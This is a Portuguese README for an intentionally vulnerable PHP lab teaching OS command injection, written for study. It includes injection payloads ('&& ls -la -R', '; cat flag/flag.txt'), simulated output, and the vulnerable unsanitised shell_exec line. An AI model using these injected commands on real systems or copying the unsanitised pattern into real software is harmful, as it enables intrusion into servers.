<div align="center">
  <h1>
    Laboratório de Command Injection
  </h1>
</div>

<p align="center">
  <img alt="Linguagem Principal" src="https://img.shields.io/github/languages/top/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=777BB4">
  <img alt="Licença" src="https://img.shields.io/github/license/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=blue">
  <img alt="Último Commit" src="https://img.shields.io/github/last-commit/vrsmarcos26/Lab-Command-Injection?style=for-the-badge&color=green">
</p>

<p align="center">
  Um painel de diagnóstico de rede moderno (Aegis Network Monitor) intencionalmente vulnerável a Command Injection, criado para fins educacionais.
</p>

<p align="center">
  <a href="#-aviso-importante">Aviso</a> •
  <a href="#-objetivos-de-aprendizagem">Objetivos</a> •
  <a href="#-tecnologias-utilizadas">Tecnologias</a> •
  <a href="#-como-acessar-o-laboratório">Como Acessar</a> •
  <a href="#-exemplo-de-exploração">Exemplo Prático</a> •
  <a href="#-créditos">Créditos</a>
</p>

---

### ⚠️ Aviso Importante

> **Este projeto é intencionalmente vulnerável.** Ele foi criado para fins estritamente educacionais e demonstração de falhas web. **NÃO FAÇA O DEPLOY DA VERSÃO DOCKER EM UM SERVIDOR PÚBLICO OU DE PRODUÇÃO.** Use-o apenas em um ambiente local e controlado.

---

### 🎯 Objetivos de Aprendizagem

Este laboratório foi projetado para demonstrar na prática:

-   O que é uma vulnerabilidade de **Injeção de Comandos (OS Command Injection)** em ambientes Linux.
-   Como a concatenação de entradas do usuário utilizando operadores de shell (`&&`, `;`, `|`) pode ser explorada para assumir o controle do servidor.
-   O perigo de utilizar funções de execução nativa do PHP, como `shell_exec()`, sem higienizar os dados.
-   A importância de validar rigorosamente as entradas vindas do lado do cliente (Front-end).

---

### 🛠️ Tecnologias Utilizadas

Este ambiente foi estruturado utilizando:

<p align="center">
  <a href="https://www.php.net/"><img src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" alt="PHP"></a>
  <a href="#"><img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" alt="JavaScript"></a>
  <a href="#"><img src="https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white" alt="Tailwind"></a>
  <a href="https://www.docker.com/"><img src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker"></a>
</p>

---

### ⚙️ Como Acessar o Laboratório

Para que você possa estudar da forma que for mais conveniente, este laboratório foi dividido em duas abordagens:

#### **Opção 1: Simulador Web (Acesso Imediato)**
Uma versão 100% Client-Side construída em JavaScript para simular a falha diretamente no seu navegador, sem a necessidade de baixar arquivos ou configurar servidores.

🔗 **[Acesse o simulador aqui](https://vrsmarcos26.github.io/Lab-Command-Injection/simulador/)**

#### **Opção 2: Servidor Linux Real (Via Docker)**
A experiência de exploração autêntica. Um ambiente isolado onde o Back-end em PHP interage com um sistema operacional real.
1. Clone o Repositório:
```bash
git clone https://github.com/vrsmarcos26/Lab-Command-Injection.git
cd Lab-Command-Injection
```
2. Suba o ambiente através do Docker:
```bash
docker-compose up -d
```
3. Acesse a aplicação no seu navegador através de: http://localhost:8000

### 🎬 Exemplo de Exploração

Abaixo, um passo a passo de como a vulnerabilidade pode ser explorada na prática, simulando o comportamento do terminal.

**1. Interceptando a Rota**
A aplicação possui um campo que espera um endereço IP. Em vez de enviar uma requisição legítima, utilizamos o operador lógico `&&` do Linux para concatenar um comando de listagem de diretórios (`ls -la -R`) logo após o alvo principal.

**Payload:** `vrsmarcos26.github.io && ls -la -R`

**2. Analisando o Resultado**
A aplicação executa o ping no domínio, mas imediatamente processa a injeção que mapeia toda a árvore de arquivos do servidor.

```text
aegis_admin@srv-01:~$ ping_tool --target vrsmarcos26.github.io && ls -la -R

PING vrsmarcos26.github.io (2606:50c0:8000::153) 56 data bytes
64 bytes from 2606:50c0:8000::153: icmp_seq=1 ttl=59 time=15.7 ms
64 bytes from 2606:50c0:8000::153: icmp_seq=2 ttl=59 time=13.5 ms

--- vrsmarcos26.github.io ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms

.:
total 36
drwxrwxrwx 1 root root 4096 ago 26 15:00 .
drwxrwxrwx 1 root root 4096 ago 26 15:00 ..
drwxrwxrwx 1 root root    0 ago 26 15:00 assets
drwxrwxrwx 1 root root    0 ago 26 15:00 flag
-rwxrwxrwx 1 root root 9941 ago 26 15:15 index.php
-rwxrwxrwx 1 root root 1073 ago 26 15:00 LICENSE
-rwxrwxrwx 1 root root 6459 ago 26 15:00 README.md

./flag:
total 5
drwxrwxrwx 1 root root    0 ago 26 15:00 .
drwxrwxrwx 1 root root 4096 ago 26 15:00 ..
-rwxrwxrwx 1 root root   24 ago 26 15:00 flag.txt
```
Ao visualizar a pasta `./flag`, o atacante pode executar um novo payload (como `127.0.0.1; cat flag/flag.txt`) para capturar o objetivo do CTF.

<details>
<summary><strong>💡 Análise Técnica da Falha (Write-up)</strong></summary>

<br>

A vulnerabilidade ocorre no núcleo do arquivo `index.php` da versão hospedada no Docker, especificamente nesta linha:
`$output = shell_exec("ping -c 4 " . $ip);`

1.  **Entrada do Usuário:** A variável `$ip` recebe o valor via método `GET` repassado de forma assíncrona pelo JavaScript do painel visual. A falha existe porque esse dado entra cru (raw), sem nenhuma sanitização (como o uso de `escapeshellarg()`).
2.  **Concatenação e Execução:** Ao concatenar a variável diretamente na string do terminal, qualquer meta-caractere interpretado pelo shell do Linux (como `;`, `|` ou `&&`) instruirá o sistema operacional a quebrar a linha de execução e inicializar um processo paralelo.
3.  **Resultado:** A função `shell_exec()` do PHP roda com os privilégios do usuário do servidor web (ex: `www-data`). Quando o atacante injeta `&& ls`, o servidor literalmente executa o `ping` e, se for bem sucedido, executa a listagem dos arquivos internos, caracterizando o **OS Command Injection**.

</details>

-----

### 🙌 Créditos

Este projeto foi inspirado e baseado nos conceitos e laboratórios práticos do **Hacking Club**, uma referência de alta qualidade para o estudo de cibersegurança e exploração web.

-----

### 📝 Licença

Este projeto está sob a licença MIT. Veja o arquivo LICENSE para mais detalhes.

<hr>

<p align="center">
Desenvolvido por <b>vrsmarcos26</b>
</p>